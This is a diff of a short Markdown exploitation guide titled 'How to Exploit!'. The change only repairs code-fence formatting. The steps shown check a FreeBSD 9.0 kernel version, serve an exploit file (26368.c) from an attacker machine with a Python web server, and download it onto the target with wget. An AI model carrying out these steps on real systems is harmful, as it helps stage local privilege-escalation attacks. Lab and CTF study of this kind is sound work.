@@ -7,14 +7,16 @@ How to Exploit!
 
 **1° Check the kernel version**
 
-```uname -a
+```
+uname -a
 
 FreeBSD freebsd 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012
 ```
 
 **2° Transfer this file to target**
 
-```Attacker machine -> python3 -m http.server 8080
+```
+Attacker machine -> python3 -m http.server 8080
 
 Target machine -> wget IP:8080/26368.c
 ```
